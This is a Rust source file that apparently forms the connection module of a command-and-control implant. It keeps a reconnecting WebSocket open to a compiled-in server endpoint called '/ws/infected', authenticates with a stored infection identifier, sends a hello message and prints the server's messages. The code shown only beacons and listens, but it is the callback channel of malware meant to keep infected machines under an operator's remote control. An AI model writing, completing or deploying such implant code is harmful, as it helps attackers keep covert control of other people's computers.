mod payloads;

use std::{
    sync::{LazyLock, Mutex},
    time::Duration,
};

use anyhow::Result;
use payloads::general::StringPayload;

use futures_util::{SinkExt, StreamExt};
use tokio::time::{Interval, interval};
use tokio_tungstenite::{
    WebSocketStream, connect_async,
    tungstenite::{Message, handshake::client::generate_key, http::Request},
};

use crate::{
    constants::compiled::{self, HTTP_COMMANDER_RECONNECT, WS_COMMANDER_RECONNECT, WS_URL},
    storage::locked_store,
};

static RUNNING: LazyLock<Mutex<bool>> = LazyLock::new(|| Mutex::new(true));

pub async fn start_ws_loop() -> Result<()> {
    let req = Request::builder()
        .uri(WS_URL("/ws/infected"))
        .header(
            "Authorization",
            format!("Bearer {}", locked_store()?.iid.as_ref().unwrap()),
        )
        .header("Host", compiled::HOST)
        .header("Connection", "Upgrade")
        .header("Upgrade", "websocket")
        .header("Sec-WebSocket-Version", "13")
        .header("Sec-WebSocket-Key", generate_key())
        .body(())
        .unwrap();
    while {
        let running = *RUNNING.lock().unwrap();
        running
    } {
        let mut ws: Option<_> = Option::None;

        let mut interval = interval(Duration::from_millis(WS_COMMANDER_RECONNECT));
        while ws.is_none() {
            match connect_async(req.clone()).await {
                Ok(res) => ws = Some(res.0),
                Err(e) => println!("Failed to connect to websocket-server: {}", e),
            }
            interval.tick().await;
        }

        let (mut sink, mut src) = ws.unwrap().split();

        println!("Connected to {}!", WS_URL(""));

        sink.send(
            payloads::SimccMessage::builder()
                .payload(payloads::Payload::Hello(
                    StringPayload::builder()
                        .content(String::from("Hello from rust!"))
                        .build(),
                ))
                .build()
                .try_into()?,
        )
        .await
        .expect("Failed to send hello-packet!");

        while let Some(msg) = src.next().await {
            match msg {
                Ok(Message::Text(text)) => println!("Got: {}", text),
                Ok(Message::Close(_)) => {
                    println!("Server closed connection");
                    break;
                }
                Err(e) => {
                    eprintln!("Error: {}", e);
                    break;
                }
                _ => {}
            }
        }
    }

    Ok(())
}
